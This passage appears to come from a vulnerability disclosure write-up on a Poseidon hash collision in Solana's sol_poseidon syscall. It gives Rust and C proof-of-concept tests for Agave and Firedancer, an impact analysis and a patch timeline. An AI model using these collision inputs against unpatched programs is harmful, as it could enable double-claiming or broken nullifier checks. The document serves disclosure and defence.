+<p>Without that, the test can fail with a runtime-accounting reason and tell us nothing about the actual bug.</p><p>So the full setup for each run is:</p><p><!-- notionvc: be59d355-f2af-4c85-a766-39984f70c5d0 --></p><ol><li>define the raw byte inputs</li><li>describe them with <code>MockSlice</code></li><li>place both descriptors and backing bytes into guest memory</li><li>expose an output buffer</li><li>top up the compute budget</li><li>call <code><span>SyscallPoseidon::rust</span></code> </li></ol> 
+<h3 id="section-12">The actual syscall PoC<!-- notionvc: d4455c43-9f99-41e5-af60-713ac28e90ee --></h3> 
+<p>With the VM layout out of the way, here is the full test added in <code><span>programs/bpf_loader/src/syscalls/mod.rs</span></code>   at tag v2.0.22:</p> <pre data-language="rust"><code>    #[test]
+    fn test_syscall_poseidon_collision() {
+        let config = Config::default();
+        prepare_mockup!(invoke_context, program_id, bpf_loader::id());
+
+        // Forged inputs with manual padding
+        let bytes1 = &amp;[0, 0, 0, 1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
+        let bytes2 = &amp;[0, 0, 0, 1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
+
+        let mock_slice1 = MockSlice {
+            vm_addr: 0x300000000,
+            len: bytes1.len(),
+        };
+        let mock_slice2 = MockSlice {
+            vm_addr: 0x400000000,
+            len: bytes2.len(),
+        };
+        let vals_1_bytes = [mock_slice1, mock_slice2];
+        let vals_1_bytes_va = 0x100000000;
+        let mut result_1_bytes = [0; poseidon::HASH_BYTES];
+        let result_1_bytes_va = 0x200000000;
+        let mut memory_mapping_1 = MemoryMapping::new(
+            vec![
+                MemoryRegion::new_readonly(bytes_of_slice(&amp;vals_1_bytes), vals_1_bytes_va),
+                MemoryRegion::new_writable(bytes_of_slice_mut(&amp;mut result_1_bytes), result_1_bytes_va),
+                MemoryRegion::new_readonly(bytes1, vals_1_bytes[0].vm_addr),
+                MemoryRegion::new_readonly(bytes2, vals_1_bytes[1].vm_addr),
+            ],
+            &amp;config,
+            &amp;SBPFVersion::V3,
+        )
+        .unwrap();
+        invoke_context.mock_set_remaining(
+            invoke_context
+                .get_compute_budget()
+                .poseidon_cost(vals_1_bytes.len() as u64)
+                .unwrap(),
+        );
+        let result_1 = SyscallPoseidon::rust(
+            &amp;mut invoke_context,
+            poseidon::Parameters::Bn254X5 as u64,
+            poseidon::Endianness::BigEndian as u64,
+            vals_1_bytes_va,
+            vals_1_bytes.len() as u64,
+            result_1_bytes_va,
+            &amp;mut memory_mapping_1,
+        );
+        assert_eq!(0, result_1.unwrap());
+
+        // Inputs without manual padding
+        let bytes3 = &amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
+        let bytes4 = &amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
+        let mock_slice3 = MockSlice {
+            vm_addr: 0x300000000,
+            len: bytes3.len(),
+        };
+        let mock_slice4 = MockSlice {
+            vm_addr: 0x400000000,
+            len: bytes4.len(),
+        };
+        let vals_2_bytes = [mock_slice3, mock_slice4];
+        let vals_2_bytes_va = 0x100000000;
+        let mut result_2_bytes = [0; poseidon::HASH_BYTES];
+        let result_2_bytes_va = 0x200000000;
+        let mut memory_mapping_2 = MemoryMapping::new(
+            vec![
+                MemoryRegion::new_readonly(bytes_of_slice(&amp;vals_2_bytes), vals_2_bytes_va),
+                MemoryRegion::new_writable(bytes_of_slice_mut(&amp;mut result_2_bytes), result_2_bytes_va),
+                MemoryRegion::new_readonly(bytes3, vals_2_bytes[0].vm_addr),
+                MemoryRegion::new_readonly(bytes4, vals_2_bytes[1].vm_addr),
+            ],
+            &amp;config,
+            &amp;SBPFVersion::V3,
+        )
+        .unwrap();
+        invoke_context.mock_set_remaining(
+            invoke_context
+                .get_compute_budget()
+                .poseidon_cost(vals_2_bytes.len() as u64)
+                .unwrap(),
+        );
+        let result_2 = SyscallPoseidon::rust(
+            &amp;mut invoke_context,
+            poseidon::Parameters::Bn254X5 as u64,
+            poseidon::Endianness::BigEndian as u64,
+            vals_2_bytes_va,
+            vals_2_bytes.len() as u64,
+            result_2_bytes_va,
+            &amp;mut memory_mapping_2,
+        );
+        assert_eq!(0, result_2.unwrap());
+
+        // HERE THE COLLISION
+        assert_eq!(result_1_bytes, result_2_bytes);
+    }</code></pre>
+<img alt="" height="148" loading="lazy" src="image-09.png" width="903"/> 
+<img alt="" height="375" loading="lazy" src="image-10.png" width="666"/> 
+<h3 id="section-13">PoC summary</h3> 
+<p>The first run uses manually padded big-endian byte strings:<!-- notionvc: c94a7599-09b1-465a-8a58-98eb58aff655 --></p> <pre data-language="rust"><code>let bytes1 = &amp;[0, 0, 0, 1u8, ...];
+let bytes2 = &amp;[0, 0, 0, 1u8, ...];</code></pre>
+<p>The second run uses the unpadded version:<!-- notionvc: f9516f13-114a-470b-8e5e-2127a273ee98 --><!-- notionvc: c94a7599-09b1-465a-8a58-98eb58aff655 --></p> <pre data-language="rust"><code>let bytes3 = &amp;[1u8, ...];
+let bytes4 = &amp;[1u8, ...];</code></pre>
+<p>In both cases, the syscall arity is 2, which keeps it aligned with the underlying <code><span>Poseidon::&lt;Fr&gt;::new_circom(vals.len())</span></code>  configuration and avoids mixing the padding issue with anything else.</p><p>Each run gets its own memory mapping and its own output buffer. That matters because it makes the result easier to read: padded pair goes through one isolated syscall execution, unpadded pair goes through another isolated execution, and the only thing we compare at the end is the final hash bytes.</p><p>So the logic is:</p><ul><li>build VM-visible inputs for the padded pair</li><li>invoke <code><span>SyscallPoseidon::rust</span></code> </li><li>collect <code><span>result_1_bytes</span></code> </li><li>build VM-visible inputs for the unpadded pair</li><li>invoke <code><span>SyscallPoseidon::rust</span></code> again</li><li>collect <code><span>result_2_bytes</span></code></li><li>assert both outputs are equal</li></ul><p><!-- notionvc: cb85d980-ad27-43f4-adf2-8cc53eec1991 --><!-- notionvc: f9516f13-114a-470b-8e5e-2127a273ee98 --><!-- notionvc: c94a7599-09b1-465a-8a58-98eb58aff655 --></p><p>That last line is the whole point to show the collision:</p> <pre data-language="rust"><code>assert_eq!(result_1_bytes, result_2_bytes);</code></pre>
+<p><i>goal reached: this VM-level PoC shows that the flaw actually crosses the syscall boundary and reaches real consumers of <code><span>sol_poseidon</span></code>. </i></p> 
+<h2 id="section-14">How bad it could be?<!-- notionvc: 6d366b35-5042-4322-87c0-7b03d36c7fe2 --></h2> 
+<p>Once <code><span>sol_poseidon</span></code> stops behaving like a collision-resistant hash at the syscall boundary, every program that uses it as a source of uniqueness, identity, commitment, or binding starts standing on very shaky ground.</p><p>The dangerous part is simple: if an attacker can provide two different byte sequences that produce the same Poseidon output under Agave’s syscall semantics, then the program may treat two distinct states as if they were the same object. And in programs logic, that is exactly the kind of assumption that tends to sit under important invariants.</p><p>In practice, that can hit several classes of logic.</p><p>Programs using <code>sol_poseidon </code>for <strong>uniqueness checks</strong> can become vulnerable to replay-style abuse. A digest meant to represent a unique mint, claim, order, note, or action can suddenly stop being unique. That opens the door to double-minting, double-claiming, repeated redemption, or bypassing one-time-use restrictions.</p><p>Programs using the digest as a <strong>storage key</strong> can also break in less obvious ways. If two distinct inputs collide to the same hash, then maps, registries, or lookup tables indexed by that hash can end up aliasing unrelated objects. That can mean overwriting entries, hijacking someone else’s slot, corrupting ownership tracking, or creating state that looks internally consistent while actually binding the wrong data together.</p><p>Any logic built around <strong>hash-based conditions or locks</strong> is also exposed. If a contract says “this action is allowed only when this Poseidon digest has not been seen before” or “this digest identifies this exact payload,” then collision control lets the attacker separate the digest from the meaning the program thinks it carries.</p><p>The impact becomes even more serious in <strong>privacy-preserving or ZK-oriented applications</strong>, where Poseidon is often used for commitments, nullifiers, Merkle leaves, or other proof-related identifiers. Those systems usually rely very heavily on the idea that distinct byte-level statements don’t collapse into the same hash. Once that assumption is false, proof systems and application logic can start disagreeing about what is actually being committed to, spent, nullified, or proven. That can lead to forged equivalences between distinct values, broken nullifier logic, or invalid state transitions that still pass application-side checks.</p><p>There’s also a more protocol-level risk here: <strong>client divergence</strong>.</p><p>This bug sits behind a syscall, which means it’s part of validator execution, not just application convenience code. If one client reproduces Agave’s behavior and another client computes a different Poseidon result for the same transaction input, then the exact same transaction can produce different execution outcomes across validators. At that point it starts becoming consensus-critical. If the mismatch affects state transitions, one client can accept a transaction that another rejects, or derive different post-execution state from the same input. In the worst case, that is the kind of discrepancy that can force emergency coordination and potentially a hard fork.</p><p>So the realistic impact range is broad:</p><p><!-- notionvc: 1298c562-3a64-4fd7-8a42-e8b09b98559c --></p><ul><li>best case, a single program using <code>sol_poseidon </code>for uniqueness or indexing gets exploitable application logic</li><li>worse case, multiple protocols inherit the same broken assumption and expose minting, spending, claiming, or proof-related bugs</li><li>worst case, different validator implementations don’t agree on syscall behavior, and the bug becomes consensus-relevant</li></ul> 
+<h2 id="section-15">Checking whether this behavior could bring the consensus problem <!-- notionvc: 694caa76-6e0b-4d9b-878c-d20e0884b7b2 --></h2> 
+<p>Therefore; after looking at the impact, it was important to know whether this was an Agave-local footgun or whether the syscall semantics had already leaked into the broader validator ecosystem.<!-- notionvc: 5f145d22-81a3-4ebf-ba27-a76ade377973 --><!-- notionvc: c94a7599-09b1-465a-8a58-98eb58aff655 --></p> 
+<h3 id="section-16">Jito: expected confirmation<!-- notionvc: a9f3845e-b5d8-4fa6-8b1e-e2f2df9d3b9f --></h3> 
+<p>Jito was the easy one, in the good and unsurprising sense.</p><p>It’s a fork, so seeing the same <code>sol_poseidon </code>behavior there wasn’t really a twist. Once the syscall path is inherited, the same bytes go through the same logic, and the same crafted padded inputs collapse the same way.</p><p><!-- notionvc: bb5ed78b-dbf2-4cc4-85d8-555f582cb35b --><!-- notionvc: 5f145d22-81a3-4ebf-ba27-a76ade377973 --><!-- notionvc: c94a7599-09b1-465a-8a58-98eb58aff655 --></p><p>So Jito mostly served as confirmation that this wasn’t some weird local build artifact or an accidental one-off in the Agave setup.</p> 
+<h3 id="section-17">Firedancer: different implementation, same thing to verify<!-- notionvc: 7eb2e5b3-2d90-4d4b-be79-577910f9cbc9 --></h3> 
+<p>Unlike Jito, there is no “well yeah, of course” explanation. If Firedancer handled the syscall differently, then this could have turned into the consensus-breaking story. If it didn’t, that would mean the bad semantics had survived contact with an entirely different implementation.</p><p>The syscall entrypoint itself looked clean enough. In <a href="https://github.com/firedancer-io/firedancer/blob/b7d097ff8/src/flamenco/vm/syscall/fd_vm_syscall_crypto.c#L288-L298" rel="noopener" target="_blank"><u>fd_vm_syscall_sol_poseidon</u></a>, Firedancer initializes a Poseidon context, appends each user-controlled input, and finalizes the hash:</p> <pre data-language="c"><code>int big_endian = endianness==0;
+fd_poseidon_t pos[1];
+fd_poseidon_init( pos, big_endian );
+
+for( ulong i=0UL; i&lt;vals_len; i++ ) {
+  if( FD_UNLIKELY( fd_poseidon_append( pos, inputs_haddr[ i ], input_vec_haddr[i].len )==NULL ) ) {
+    goto soft_error;
+  }
+}
+
+ret = !fd_poseidon_fini( pos, hash_result );</code></pre>
+<p>Nothing suspicious there by itself. But how exactly do raw user bytes become the field elements that Poseidon actually hashes?</p><p><!-- notionvc: c493c667-7ae8-48c0-bdfa-0f8a5a19a399 --></p><p>That happens in <u><a href="https://github.com/firedancer-io/firedancer/blob/b7d097ff8/src/ballet/bn254/fd_poseidon.c#L107-L117" rel="noopener" target="_blank">fd_poseidon_append</a></u>: </p> <pre data-language="c"><code>fd_bn254_scalar_t cur[1] = { 0 };
+fd_memcpy( cur-&gt;buf + (32-sz)*(pos-&gt;big_endian?1:0), data, sz );
+if( pos-&gt;big_endian ) {
+  fd_uint256_bswap( cur, cur );
+}
+
+if( FD_UNLIKELY( !fd_bn254_scalar_validate( cur ) ) ) {
+  return NULL;
+}
+pos-&gt;cnt++;
+fd_bn254_scalar_to_mont( &amp;pos-&gt;state[ pos-&gt;cnt ], cur );</code></pre>
+<p>This is where my eyebrow went up again.</p><p><code><span>cur</span></code><code> </code>starts zero-initialized. Then <code><span>fd_memcpy(…)</span></code>  copies only <code>sz</code> bytes into the buffer, either aligned toward one side or the other depending on endianness. Everything that isn’t overwritten stays zero.</p><p>That means the load step is already performing an implicit zero-padding operation before the scalar is validated and moved into the Poseidon state.</p><p>And that is exactly the kind of setup that deserves a closer look, because once implicit padding exists, manual padding becomes dangerous if both end up producing the same in-memory scalar.</p><p>As previously with Agave, such patterns occurs also in Firedancer:</p><p>For big-endian inputs:</p><ul><li>user input A already contains leading zeroes</li><li>user input B is shorter, but lands in the same zero-filled 32-byte buffer</li><li>after the copy, both can become identical scalar representations</li></ul><p>For little-endian, the ambiguity moves to the other side of the buffer, so manually appended trailing zeroes can collapse the same way.</p><p><!-- notionvc: 7f344340-b846-46ff-a954-a6d47f2f29c2 --></p><p>Here is a little PoC just to validate the theory:</p> <pre data-language="c"><code>{
+	// Manually padded
+      static const uchar input0[2][32] = {
+       { 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 },
+       { 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 }
+      };
+      
+      uchar output0[32] = { 0 };
+      fd_poseidon_t pos[1];
+      fd_poseidon_init( pos, 1 );
+      for (ulong i = 0; i &lt; 2; ++i) {
+          fd_poseidon_append( pos, input0[i], 32 );
+      }
+
+      fd_poseidon_hash_result_t res;
+      fd_poseidon_fini( pos, res.v );
+      fd_memcpy(output0, res.v, 32);
+
+	// Will be implicitly padded
+      static const uchar input1[2][29] = {
+       { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 },
+       { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 }
+      };
+      
+      uchar output1[32] = { 0 };
+      fd_poseidon_init( pos, 1 );
+      for (ulong i = 0; i &lt; 2; ++i) {
+          fd_poseidon_append( pos, input1[i], 29 );
+      }
+
+      fd_poseidon_fini( pos, res.v );
+      fd_memcpy(output1, res.v, 32);
+      
+      // COLLISION
+      FD_TEST(memcmp(output0, output1, 32) == 0);
+  }
+  
+  {
+	// Manually padded
+        static const uchar input0[2][32] = {
+         { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0 },
+         { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0 }
+        };
+        
+        uchar output0[32] = { 0 };
+        fd_poseidon_t pos[1];
+        fd_poseidon_init( pos, 0 );
+        for (ulong i = 0; i &lt; 2; ++i) {
+            fd_poseidon_append( pos, input0[i], 32 );
+        }
+  
+        fd_poseidon_hash_result_t res;
+        fd_poseidon_fini( pos, res.v );
+        fd_memcpy(output0, res.v, 32);
+  
+	// Will be implicitly padded
+        static const uchar input1[2][29] = {
+         { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 },
+         { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 }
+        };
+        
+        uchar output1[32] = { 0 };
+        fd_poseidon_init( pos, 0 );
+        for (ulong i = 0; i &lt; 2; ++i) {
+            fd_poseidon_append( pos, input1[i], 29 );
+        }
+  
+        fd_poseidon_fini( pos, res.v );
+        fd_memcpy(output1, res.v, 32);
+        
+        // COLLISION
+        FD_TEST(memcmp(output0, output1, 32) == 0);
+  }</code></pre>
+<img alt="" height="115" loading="lazy" src="image-11.png" width="1024"/> 
+<p>Damn, so Agave reached the bad semantics through the light-poseidon byte-hashing path meanwhile Firedancer reached them through manual loading into a zero-initialized scalar buffer. In the end, eventhough the different plumbing: same collapse.</p> 
+<img alt="" height="500" loading="lazy" src="image-12.png" width="544"/> 
+<h5>What mattered here</h5> 
+<p>Happily, this wasn’t the nasty consensus version of the story. No client divergence, no chain split, no hard-fork fire drill <em>(for now, since with a new validator or an enhanced poseidon feature could bring it…)</em>.</p><p>But the vuln was still there across validators.</p><p>Not because every implementation shared the exact same bug, but because they ended up exposing the same broken cryptographic behavior through different code paths.</p><p><!-- notionvc: a6d3b51c-f1b6-41c9-9af4-8a5095c9a871 --></p><p>For a native syscall that people are expected to trust as a cryptographic primitive, that is already a critical issue.</p> 
+<h2 id="section-18">Flows summary</h2> 
+<img alt="" height="314" loading="lazy" src="image-13.png" width="1024"/> 
+<img alt="" height="313" loading="lazy" src="image-14.png" width="1024"/> 
+<h2 id="section-19">Patch &amp; Timeline</h2> 
+<ul>
+<li><strong>2025-01-23</strong> – The advisory is opened. <i>Credit added to <a href="https://x.com/Ectari0">Ectario</a> as Finder &amp; <a href="https://x.com/FabrismeGoeland">Fabrisme</a> as Analyst</i> <em>(<strong>GHSA-7238-xp4x-mfch)</strong></em></li>
+<li><strong>2025-01-27</strong> – The issue is acknowledged as real and classified as <strong>critical</strong>. Around the same time, the patch direction is to stop accepting ambiguous byte encodings by enforcing a canonical input length.</li>
+<li><strong>2025-02-26</strong> – The rollout stalls for a practical reason: enforcing exact 32-byte inputs in validators would break downstream consumers, especially <strong>Light Protocol</strong>, which still had places relying on shorter byte slices. So the order becomes: fix downstream first, then fix the dependency, then fix the validator.</li>
+<li><strong>2025-08-07</strong> – The downstream cleanup path becomes concrete. In the advisory thread, Anza says Light Protocol had already started moving toward explicit padding, and <a href="https://github.com/Lightprotocol/light-protocol/pull/1905" rel="noopener" target="_blank"><strong>Light Protocol PR #1905</strong></a> is used to clean up remaining callsites so Poseidon inputs consistently become <strong>exactly 32 bytes</strong>. <i>That PR is not the core vulnerability fix by itself, but it is what makes the validator-side fix deployable without breaking downstream code.</i></li>
+<li><strong>2025-08-19</strong> – The first real code fix lands in the dependency: light-poseidon<strong> <a href="https://github.com/Lightprotocol/light-poseidon/pull/50" rel="noopener" target="_blank">PR #50</a></strong>, <em>fix: Enforce byte input length for the given prime field</em>, is merged. This is the key library patch. After the patch, short inputs are no longer accepted: for BN254, every input has to match the modulus byte length, which is <strong>32 bytes</strong>, so padding becomes explicit and unique.</li>
+<li><strong>2025-09-22</strong> – The validator-side rule is formalized in <a href="https://github.com/solana-foundation/solana-improvement-documents/blob/main/proposals/0359-poseidon-enforce-input-length.md" rel="noopener" target="_blank"><strong>SIMD-0359</strong></a>, <em>Poseidon Syscall – Enforce Input Length</em>. This is where the change is written down as protocol behavior rather than just a library patch. The proposal states the old rule as <span data-latex="inline" data-original-text="0 &lt;= n &lt;= bytelen(p)">0 \le n \le \operatorname{bytelen}(p)</span> and the new rule as <span data-latex="inline" data-original-text="n = bytelen(p)">n = \operatorname{bytelen}(p)</span> . For BN254, that means fixed <strong>32-byte</strong> inputs, with explicit zero padding when needed.</li>
+<li><strong>2025-09-30</strong> – <a href="https://github.com/solana-foundation/solana-improvement-documents/pull/367" rel="noopener" target="_blank"><strong>SIMD PR #367</strong></a> is merged into the Solana Improvement Documents repo. It is now an agreed protocol change with a defined rollout path.</li>
+<li><strong>2025-10-17</strong> – On the Agave side, <a href="https://github.com/anza-xyz/agave/issues/8533" rel="noopener" target="_blank"><strong>issue #8533</strong></a> opens the feature gate for this change. The issue restates the exact problem very clearly: the syscall already enforced the <strong>maximum</strong> input size, but not the <strong>minimum</strong>, so it would now require explicit zero padding as well. It also assigns the feature id: <code><span>poUdAqRXXsNmfqAZ6UqpjbeYgwBygbfQLEvWSqVhSnb</span></code>.</li>
+<li><strong>2025-10-17</strong> – The actual Agave implementation appears in <a href="https://github.com/anza-xyz/agave/pull/8534" rel="noopener" target="_blank"><strong>PR #8534</strong></a>, <a href="https://github.com/solana-foundation/solana-improvement-documents/blob/main/proposals/0359-poseidon-enforce-input-length.md" rel="noopener" target="_blank"><em>SIMD-0359: Enforce padding in Poseidon hash inputs</em></a>. This is the important technical bridge between the dependency patch and validator rollout. The PR explains that <code><span>light-poseidon 0.4.0</span></code>  now requires each input to match the modulus byte length, so smaller inputs such as <code>[1]</code>, <code>[0,1]</code>, or <code>[0,0,0,1]</code> are no longer valid. It also explains why this cannot just be turned on immediately: the change is guarded behind a feature flag, <code><span>poseidon_enforce_padding</span></code> , and when the flag is off Agave keeps the old dependency versions so legacy behavior remains unchanged until activation. (<a href="https://github.com/firedancer-io/firedancer/pull/7270" rel="noopener" target="_blank">Firedancer PR</a> also made that day)</li>
+<li><strong>2025-10-29</strong> – <strong>Agave <a href="https://github.com/anza-xyz/agave/pull/8534" rel="noopener" target="_blank">PR #8534</a></strong> is merged. So by late October 2025 the code is in Agave, but still behind a feature gate. <i>That is an important distinction: <strong>merged</strong> does not mean <strong>active on-chain</strong> yet.</i></li>
+<li><strong>Late 2025 / early 2026</strong> – The rollout continues through the normal feature-gate process. Agave’s own feature-gate guidelines say activations go <strong>testnet first, then devnet, then mainnet-beta</strong>. The Agave tracker later shows SIMD-0359 associated with minimum versions across <strong>Agave, Firedancer, and Jito</strong>.</li>
+<li><strong>2026-02-25</strong> – In the advisory thread, Anza says the change has been pushed to <strong>master/v3.1</strong> through <a href="https://github.com/anza-xyz/agave/pull/8534" rel="noopener" target="_blank"><strong>#8534</strong></a>, and that the feature has already been <a href="https://explorer.solana.com/tx/3gCnCXEg1W6F8CgsmVbVxQuUiwYnyyPj6jmxYfyvcPSr74GLvfTTmLDu2ACdSG8uGk8ff8Bx1Uz2Fa9c19tATg5g?cluster=testnet" rel="noopener" target="_blank"><strong>activated on testnet</strong></a>.</li>
+<li><strong>2026-03-12</strong> – In the same advisory thread, this is referenced as the <a href="https://explorer.solana.com/tx/3fK4oQpubJGt3ZHox2rqC1WUmeFsX7kit3WFnBdUCJLcdnJDjVpPqkggoXjFPco8d5AaxF6gEtC32f6GzeAz8dbw" rel="noopener" target="_blank"><strong>mainnet-beta activation</strong></a> date for the feature gate (stake validators &gt;95% with the right version &amp; feature gate enabled).</li>
+<li><strong>2026-04</strong>: bounty acknowledged, publication approved, advisory closed.</li>
+</ul> 
+<h2 id="section-20">References</h2> 
+<ul><li><a href="https://github.com/anza-xyz/agave/security" rel="noopener" target="_blank">Agave security policy</a></li><li><a href="https://github.com/anza-xyz/agave" rel="noopener" target="_blank">Agave repository</a></li><li><a href="https://github.com/anza-xyz" rel="noopener" target="_blank">Anza GitHub organization</a></li><li><a href="https://github.com/solana-labs/solana" rel="noopener" target="_blank">Original Solana validator repository</a></li><li><a href="https://www.helius.dev/blog/solana-virtual-machine" rel="noopener" target="_blank">Helius: The Solana Virtual Machine</a></li><li><a href="https://github.com/anza-xyz/sbpf" rel="noopener" target="_blank">Anza sBPF repository</a></li><li><a href="https://secret.club/2022/05/11/fuzzing-solana.html" rel="noopener" target="_blank">secret.club: Fuzzing Solana, part 1</a></li><li><a href="https://secret.club/2022/05/11/fuzzing-solana-2.html" rel="noopener" target="_blank">secret.club: Fuzzing Solana, part 2</a></li><li><a href="https://www.zellic.io/blog/solana-sbpf/" rel="noopener" target="_blank">Zellic: Solana sBPF</a></li><li><a href="https://github.com/solana-foundation/solana-com/blob/main/apps/docs/content/docs/en/core/programs/syscall-reference.mdx" rel="noopener" target="_blank">Solana syscall reference</a></li><li><a href="https://github.com/anza-xyz/agave/blob/master/program-runtime/src/execution_budget.rs" rel="noopener" target="_blank">Agave execution budget source</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon#performance" rel="noopener" target="_blank">light-poseidon performance notes</a></li><li><a href="https://github.com/anza-xyz/agave/blob/v2.0.22/programs/bpf_loader/src/syscalls/mod.rs" rel="noopener" target="_blank">Agave v2.0.22 syscall module</a></li><li><a href="https://github.com/anza-xyz/agave/blob/v2.0.22/programs/bpf_loader/src/syscalls/mod.rs#L1797" rel="noopener" target="_blank">Agave Poseidon syscall handler</a></li><li><a href="https://github.com/anza-xyz/agave/blob/v2.0.22/poseidon/src/lib.rs#L215" rel="noopener" target="_blank">Agave Poseidon hashv implementation</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L258-L308" rel="noopener" target="_blank">light-poseidon hash_bytes_be implementation</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L416-L437" rel="noopener" target="_blank">light-poseidon hash implem by endianness</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L444-L469" rel="noopener" target="_blank">light-poseidon security checks</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L471-L495" rel="noopener" target="_blank">light-poseidon scalar loading path</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L372-L414" rel="noopener" target="_blank">light-poseidon sponge hash function</a></li><li><a href="https://rareskills.io/post/solana-memory-layout" rel="noopener" target="_blank">RareSkills: Solana memory layout</a></li><li><a href="https://github.com/firedancer-io/firedancer/blob/b7d097ff8/src/flamenco/vm/syscall/fd_vm_syscall_crypto.c#L293" rel="noopener" target="_blank">Firedancer Poseidon syscall entrypoint</a></li><li><a href="https://github.com/firedancer-io/firedancer/blob/b7d097ff8/src/ballet/bn254/fd_poseidon.c#L107-L117" rel="noopener" target="_blank">Firedancer fd_poseidon_append implementation</a></li><li><a href="https://github.com/Lightprotocol/light-protocol/pull/1905" rel="noopener" target="_blank">Light Protocol PR #1905</a></li><li><a href="https://github.com/Lightprotocol/light-poseidon/pull/50" rel="noopener" target="_blank">light-poseidon PR #50</a></li><li><a href="https://github.com/solana-foundation/solana-improvement-documents/blob/main/proposals/0359-poseidon-enforce-input-length.md" rel="noopener" target="_blank">SIMD-0359: Poseidon syscall input length enforcement</a></li><li><a href="https://github.com/solana-foundation/solana-improvement-documents/pull/367" rel="noopener" target="_blank">SIMD PR #367</a></li><li><a href="https://github.com/anza-xyz/agave/issues/8533" rel="noopener" target="_blank">Agave issue #8533</a></li><li><a href="https://github.com/anza-xyz/agave/pull/8534" rel="noopener" target="_blank">Agave PR #8534</a></li><li><a href="https://github.com/firedancer-io/firedancer/pull/7270" rel="noopener" target="_blank">Firedancer PR #7270</a></li><li><a href="https://explorer.solana.com/tx/3gCnCXEg1W6F8CgsmVbVxQuUiwYnyyPj6jmxYfyvcPSr74GLvfTTmLDu2ACdSG8uGk8ff8Bx1Uz2Fa9c19tATg5g?cluster=testnet" rel="noopener" target="_blank">Solana testnet feature activation transaction</a></li><li><a href="https://explorer.solana.com/tx/3fK4oQpubJGt3ZHox2rqC1WUmeFsX7kit3WFnBdUCJLcdnJDjVpPqkggoXjFPco8d5AaxF6gEtC32f6GzeAz8dbw" rel="noopener" target="_blank">Solana mainnet-beta feature activation transaction</a></li></ul><p><!-- notionvc: 866c194f-3723-458d-8c2c-d6128168d96f --></p> 
